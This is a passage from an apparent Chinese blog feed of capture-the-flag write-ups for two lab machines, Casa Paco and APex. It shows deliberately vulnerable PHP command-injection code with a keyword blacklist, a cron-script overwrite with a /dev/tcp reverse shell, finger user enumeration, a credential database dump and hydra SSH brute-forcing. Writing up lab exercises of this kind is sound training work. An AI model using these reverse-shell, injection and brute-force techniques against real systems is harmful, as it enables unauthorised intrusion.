```bash
msf6 &gt; post/multi/recon/local_exploit_suggester
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_ensala-papas.html</guid><pubDate>Fri, 27 Jun 2025 09:33:53 +0000</pubDate></item><item><title>thl_casa-paco</title><link>https://7r1UMPHK.github.io/post/thl_casa-paco.html</link><description># thl_casa-paco

# 0.简介

**靶机**：[thehackerslabs - casa-paco](https://thehackerslabs.com/casa-paco/)
**难度**：初学者
**目标 IP**：192.168.205.137
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.137
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 09:41 CST
Nmap scan report for 192.168.205.137
Host is up (0.00084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E2:C1:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds

```

先看**80端口**，**22端口**候补

# 2.踩点

![image](https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370)

把域名加入`hosts`

![image](https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c)

是个点餐的网站，你按照它的提示一直点到下单页，你发现`Plato`可以**执行命令**，但是有**限制**，连`ls`都无法执行,并且**无法绕过**，爆破一下可执行命令

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u 'http://casapaco.thl/llevar.php' -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt --hc 404 -d 'name=a&amp;dish=FUZZ' --hw 89,75
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://casapaco.thl/llevar.php
Total requests: 475254

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                            
=====================================================================

000000023:   200        32 L     109 W      1276 Ch     'w'                                                                
000000110:   200        36 L     126 W      1478 Ch     'df'                                                               
000000125:   200        33 L     95 W       1184 Ch     'du'                                                               
000000238:   200        31 L     92 W       1202 Ch     'id'                                                               
000000435:   200        50 L     170 W      1814 Ch     'ps'                                                               
000000394:   200        31 L     90 W       1156 Ch     'od'                                                               
000000513:   200        70 L     390 W      5108 Ch     'ss'                                                               
000000601:   200        31 L     93 W       1172 Ch     'wc'                                                               
000000581:   200        32 L     173 W      3792 Ch     'vi'                                                               
000001112:   200        59 L     265 W      2439 Ch     'apt'                                                              
000001160:   200        34 L     110 W      1476 Ch     'arp'                                                              
000002956:   200        31 L     95 W       1215 Ch     'dir'  
（省略）
```

发现可以执行`dir`

![image](https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a)

当你`dir`，你就会发现有一个叫`llevar1.php`的页面（爆破不出来，只可以这样看），你可以使用`od`工具查看他文本

![image](https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68)

我直接放**可读版本**了，想看原版的，自己执行一下

```bash
&lt;!DOCTYPE html&gt;
&lt;html lang='es'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;
    &lt;title&gt;Casa Paco - Para Llevar&lt;/title&gt;
    &lt;link rel='stylesheet' href='static/styles.css'&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;
        &lt;h1&gt;Casa Paco - Pedido para Llevar&lt;/h1&gt;
    &lt;/header&gt;

    &lt;main&gt;
        &lt;h2&gt;Haz tu pedido para llevar&lt;/h2&gt;
        &lt;form action='llevar.php' method='POST' class='order-form'&gt;
            &lt;label for='name'&gt;Nombre:&lt;/label&gt;
            &lt;input type='text' id='name' name='name' placeholder='Tu nombre' required&gt;&lt;br&gt;
          
            &lt;label for='dish'&gt;Plato:&lt;/label&gt;
            &lt;input type='text' id='dish' name='dish' placeholder='Ejemplo: Pizza' required&gt;&lt;br&gt;
          
            &lt;button type='submit' class='btn'&gt;Enviar Pedido&lt;/button&gt;
        &lt;/form&gt;

        &lt;?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $name = htmlspecialchars($_POST['name']); // Sanitizamos para evitar errores visuales
            $dish = $_POST['dish']; // Intencionalmente sin sanitizar para la vulnerabilidad

            // Comando vulnerable
            $output = shell_exec('$dish');

            echo '&lt;section class='confirmation'&gt;';
            echo '&lt;h3&gt;Pedido confirmado&lt;/h3&gt;';
            echo '&lt;p&gt;Gracias, &lt;strong&gt;$name&lt;/strong&gt;. Tu pedido de &lt;strong&gt;$dish&lt;/strong&gt; está listo para llevar.&lt;/p&gt;';
            echo '&lt;h3&gt;Salida del Comando:&lt;/h3&gt;';
            echo '&lt;pre&gt;$output&lt;/pre&gt;';
            echo '&lt;/section&gt;';
        }
        ?&gt;
    &lt;/main&gt;

    &lt;footer&gt;
        &lt;p&gt;&amp;copy; 2025 Casa Paco. Todos los derechos reservados.&lt;/p&gt;
    &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
```

实现的和`llevar.php`一样，但是他没有**限制**，但是你不**锁死**这个网页，他就会把你的命令交给`llevar.php`执行，就寄寄，下面是`llevar.php`的代码

```bash
&lt;!DOCTYPE html&gt;
&lt;html lang='es'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;
    &lt;title&gt;Casa Paco - Pedido para Llevar&lt;/title&gt;
    &lt;link rel='stylesheet' href='static/styles.css'&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;
        &lt;h1&gt;Casa Paco - Pedido para Llevar&lt;/h1&gt;
    &lt;/header&gt;

    &lt;main&gt;
        &lt;h2&gt;Haz tu pedido para llevar&lt;/h2&gt;
        &lt;form action='llevar.php' method='POST' class='order-form'&gt;
            &lt;label for='name'&gt;Nombre:&lt;/label&gt;
            &lt;input type='text' id='name' name='name' placeholder='Tu nombre' required&gt;&lt;br&gt;

            &lt;label for='dish'&gt;Plato:&lt;/label&gt;
            &lt;input type='text' id='dish' name='dish' placeholder='Ejemplo: Cocido' required&gt;&lt;br&gt;

            &lt;button type='submit' class='btn'&gt;Enviar Pedido&lt;/button&gt;
        &lt;/form&gt;
    &lt;/main&gt;

    &lt;?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $name = htmlspecialchars($_POST['name']);
        $dish = $_POST['dish'];

        // Filtrar comandos potencialmente peligrosos
        $blacklist_pattern = '/\b(whoami|ls|pwd|cat|sh|bash)\b/i';
        if (preg_match($blacklist_pattern, $dish)) {
            die('&lt;p style='color: red;'&gt;Error: Pedido comprometido.&lt;/p&gt;');
        }

        // Permitir solo caracteres válidos
        $allowed_pattern = '/^[a-zA-Z0-9\s\-_\.]+$/';
        if (!preg_match($allowed_pattern, $dish)) {
            die('&lt;p style='color: red;'&gt;Error: Pedido contiene caracteres no permitidos.&lt;/p&gt;');
        }

        // Ejecutar comando (no debe ser usado en un entorno de producción sin validaciones más estrictas)
        $output = shell_exec($dish);
        echo '&lt;section class='confirmation'&gt;';
        echo '&lt;h3&gt;Pedido confirmado&lt;/h3&gt;';
        echo '&lt;p&gt;Gracias, &lt;strong&gt;$name&lt;/strong&gt;. Tu pedido de &lt;strong&gt;$dish&lt;/strong&gt; estará listo para llevar.&lt;/p&gt;';
        echo '&lt;h3&gt;Salida del Comando:&lt;/h3&gt;';
        echo '&lt;pre&gt;$output&lt;/pre&gt;';
        echo '&lt;/section&gt;';
    }
    ?&gt;
  
    &lt;footer&gt;
        &lt;p&gt;&amp;copy; 2025 Casa Paco. Todos los derechos reservados.&lt;/p&gt;
    &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;

```

那就简单了我们锁死`llevar1.php`提交命令就好了

![image](https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06)

要进行**base64绕过**，不然执行不了

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                  
listening on [any] 8888 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 45002
bash: cannot set terminal process group (534): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Thehackerslabs-CasaPaco:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@Thehackerslabs-CasaPaco:/var/www/html$ cd /home/
www-data@Thehackerslabs-CasaPaco:/home$ ls -la
total 12
drwxr-xr-x  3 root        root        4096 Jan 14 16:52 .
drwxr-xr-x 18 root        root        4096 Jan 13 14:47 ..
drwxr-xr-x  3 pacogerente pacogerente 4096 Jan 14 17:08 pacogerente
www-data@Thehackerslabs-CasaPaco:/home$ cd pacogerente/
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls -al
total 36
drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 14 17:08 .
drwxr-xr-x 3 root        root        4096 Jan 14 16:52 ..
lrwxrwxrwx 1 root        root           9 Jan 14 16:58 .bash_history -&gt; /dev/null
-rw-r--r-- 1 pacogerente pacogerente  220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 pacogerente pacogerente 3526 Mar 29  2024 .bashrc
drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 13 20:24 .local
-rw-r--r-- 1 pacogerente pacogerente  807 Mar 29  2024 .profile
-rwxrw-rw- 1 pacogerente pacogerente  110 Jan 14 16:57 fabada.sh
-rw-r--r-- 1 root        root        2417 Jan 15 03:06 log.txt
-rw-r--r-- 1 pacogerente pacogerente   33 Jan 14 17:06 user.txt
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh
#!/bin/bash

# Generar un log de actividad
echo 'Ejecutado por cron el: $(date)' &gt;&gt; /home/pacogerente/log.txt

```

写个脚本覆盖掉`fabada.sh`就行了（不要问我为什么不看`pspy`，我看它长的都像定时任务☝( ◠‿◠ )☝）

```bash
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ echo -e '#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1' &gt; fabada.
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh 
#!/bin/bash
/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1
```

等一会，它定时挺快的

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8889
listening on [any] 8889 ...
iconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 42802
bash: no se puede establecer el grupo de proceso de terminal (4096): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@Thehackerslabs-CasaPaco:~# d
id
uid=0(root) gid=0(root) grupos=0(root)

```

下班sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_casa-paco.html</guid><pubDate>Fri, 27 Jun 2025 09:33:50 +0000</pubDate></item><item><title>nyx_APex</title><link>https://7r1UMPHK.github.io/post/nyx_APex.html</link><description># nyx_APex

# 0.简介

**靶机**：[vulnyx - APex](https://vulnyx.com/file/APex.php)
**难度**：Easy
**目标 IP**：192.168.205.148
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.148
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 19:17 CST
Nmap scan report for 192.168.205.148
Host is up (0.00026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
79/tcp open  finger
80/tcp open  http
MAC Address: 08:00:27:8E:D9:36 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds

```

其中79是我没有见过的服务，优先级最高

# 2.踩点

在hacktricks搜索到了相关[网页](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html#79---pentesting-finger)

![Image](https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a)

有Metasploit的脚本，我们优先利用一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ msfconsole
msf6 &gt; use auxiliary/scanner/finger/finger_users
msf6 auxiliary(scanner/finger/finger_users) &gt; show options 

Module options (auxiliary/scanner/finger/finger_users):

   Name        Current Setting                        Required  Description
   ----        ---------------                        --------  -----------
   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
                                                                ploit/basics/using-metasploit.html
   RPORT       79                                     yes       The target port (TCP)
   THREADS     1                                      yes       The number of concurrent threads (max one per host)
   USERS_FILE  /usr/share/metasploit-framework/data/  yes       The file that contains a list of default UNIX accounts.
               wordlists/unix_users.txt


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/finger/finger_users) &gt; set RHOSTS 192.168.205.148
RHOSTS =&gt; 192.168.205.148
msf6 auxiliary(scanner/finger/finger_users) &gt; run
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: _apt
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: backup
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: bin
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: daemon
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: dnsmasq
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: games
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: gnats
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: irc
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: list
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: lp
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: mail
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: man
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: messagebus
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: news
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: nobody
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: proxy
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: root
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sshd
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sync
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sys
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-coredump
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-network
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-resolve
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-timesync
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uucp
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uuidd
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: www-data
[+] 192.168.205.148:79    - 192.168.205.148:79 Users found: _apt, backup, bin, daemon, dnsmasq, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, uuidd, www-data
[*] 192.168.205.148:79    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

提取数据进行爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat user |awk -F ': ' '{print $2}'
_apt
backup
bin
daemon
dnsmasq
games
gnats
irc
list
lp
mail
man
messagebus
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
uuidd
www-data
┌──(kali㉿kali)-[~/test]
└─$ while read -r user; do echo '$user' | nc -vn 192.168.205.148 79; done &lt; user
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: _apt                             Name: 
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: backup                           Name: backup
Directory: /var/backups                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: bin                              Name: bin
Directory: /bin                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: daemon                           Name: daemon
Directory: /usr/sbin                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: dnsmasq                          Name: dnsmasq
Directory: /var/lib/misc                Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: games                            Name: games
Directory: /usr/games                   Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: gnats                            Name: Gnats Bug-Reporting System (admin)
Directory: /var/lib/gnats               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: irc                              Name: ircd
Directory: /run/ircd                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: list                             Name: Mailing List Manager
Directory: /var/list                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: lp                               Name: lp
Directory: /var/spool/lpd               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: mail                             Name: mail
Directory: /var/mail                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: man                              Name: man
Directory: /var/cache/man               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: messagebus                       Name: 
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: news                             Name: news
Directory: /var/spool/news              Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: nobody                           Name: nobody
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: proxy                            Name: proxy
Directory: /bin                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sshd                             Name: 
Directory: /run/sshd                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sync                             Name: sync
Directory: /bin                         Shell: /bin/sync
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sys                              Name: sys
Directory: /dev                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-coredump                 Name: systemd Core Dumper
Directory: /                            Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-network                  Name: systemd Network Management
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-resolve                  Name: systemd Resolver
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-timesync                 Name: systemd Time Synchronization
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: uucp                             Name: uucp
Directory: /var/spool/uucp              Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: uuidd                            Name: 
Directory: /run/uuidd                   Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: www-data                         Name: www-data
Directory: /var/www                     Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.

```

没有有意思的东西，我们去看看Web服务吧

![Image](https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b)

没有有意思的东西，源码也没有，我们去爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u 'http://192.168.205.148' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.148
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,md,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 401) [Size: 462]
/index.html           (Status: 200) [Size: 878]
/server-status        (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]

```

![Image](https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7)

好像找到重点了，扫描一下架构

```bash
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u 192.168.205.148                      

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 7656
[INF] Executing 7276 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 380 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
[INF] Templates clustered: 1698 (Reduced 1598 Requests)
[INF] Using Interactsh Server: oast.fun
[waf-detect:apachegeneric] [http] [info] http://192.168.205.148
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.148:22
[ssh-server-enumeration] [javascript] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[ssh-password-auth] [javascript] [info] 192.168.205.148:22
[ssh-auth-methods] [javascript] [info] 192.168.205.148:22 ['['publickey','password']']
[openssh-detect] [tcp] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[options-method] [http] [info] http://192.168.205.148 ['HEAD,GET,POST,OPTIONS']
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.148
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.148
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.148
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.148
[apache-detect] [http] [info] http://192.168.205.148 ['Apache/2.4.62 (Debian)']

```

无果，拷一份网站下来，还是没有东西。仔细想想好像就只有那个法老有特色了，搜一下

![Image](https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e)

等会，不会是在那个79服务看这个人的信息吧

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -vn 192.168.205.148 79
(UNKNOWN) [192.168.205.148] 79 (finger) open
Horus
finger: Horus: no such user.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ nc -vn 192.168.205.148 79
(UNKNOWN) [192.168.205.148] 79 (finger) open
horus      
Login: horus                            Name: 
Directory: /home/horus                  Shell: /bin/bash
Never logged in.
Mail forwarded to horus@point.nyx
No mail.
PGP key:
personal notes: H0Ru$$3rv3
No Plan.
```

我去.....

![Image](https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa)

下载下来看看

```bash
┌──(kali㉿kali)-[~/test]
└─$ sqlite3 ~/Downloads/database.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter '.help' for usage hints.
sqlite&gt; .tables
users
sqlite&gt; select * from users
   ...&gt; ;
1|anubis|L44NxKRnP7wxrBsxibpDORySkbEHRO
2|amon|xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
3|seth|Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
4|osiris|ITA96l3isg4uV2Sm8eYn41XVfxprFy
```

尝试爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp|awk -F '|' '{print $2}'
anubis
amon
seth
osiris

                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat tmp|awk -F '|' '{print $2}' &gt; user
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat user      
anubis
amon
seth
osiris

                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat tmp|awk -F '|' '{print $3}' &gt; pass
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat pass                            
L44NxKRnP7wxrBsxibpDORySkbEHRO
xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
ITA96l3isg4uV2Sm8eYn41XVfxprFy

                                      
```

hydra启动

```bash
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P pass ssh://192.168.205.148 -I -u -f -e nsr -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-22 19:49:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 40 tasks per 1 server, overall 40 tasks, 40 login tries (l:5/p:8), ~1 try per task
[DATA] attacking ssh://192.168.205.148:22/
[22][ssh] host: 192.168.205.148   login: seth   password: xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 19:49:58

```

登录

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh seth@192.168.205.148     
The authenticity of host '192.168.205.148 (192.168.205.148)' can't be established.
ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.148' (ED25519) to the list of known hosts.
seth@192.168.205.148's password: 
seth@apex:~$ id
uid=1001(seth) gid=1001(seth) grupos=1001(seth)

```

# 3.提权

```bash
seth@apex:~$ sudo -l
-bash: sudo: orden no encontrada
seth@apex:~$ which sudo
seth@apex:~$ cat /etc/sudo
sudo.conf          sudoers            sudoers.d/         sudo_logsrvd.conf  
seth@apex:~$ cat /etc/sudoers
cat: /etc/sudoers: Permiso denegado
seth@apex:~$ /etc/sudo -l
-bash: /etc/sudo: No existe el fichero o el directorio
seth@apex:~$ find / -name sudo 2&gt;/dev/null
/var/lib/sudo
/etc/init.d/sudo
/etc/pam.d/sudo
/run/sudo
/usr/sbin/sudo
/usr/share/lintian/overrides/sudo
/usr/share/bash-completion/completions/sudo
/usr/share/doc/sudo
/usr/lib/sudo
seth@apex:~$ /run/sudo -l
-bash: /run/sudo: Es un directorio
seth@apex:~$ /usr/sbin/sudo -l
Matching Defaults entries for seth on apex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User seth may run the following commands on apex:
    (root) NOPASSWD: /usr/bin/nmcli

```

还真有人干这事啊，然后我就卡住了。等到8点群里大佬发了wp我才发现又是缩小提权

![Image](https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3)

在城南花已开大佬的wp看到了原理：

![Image](https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8)

```bash
!/bin/bash
root@apex:/home/seth# iduid=0(root) gid=0(root) grupos=0(root)
```

以下也是大佬的思路

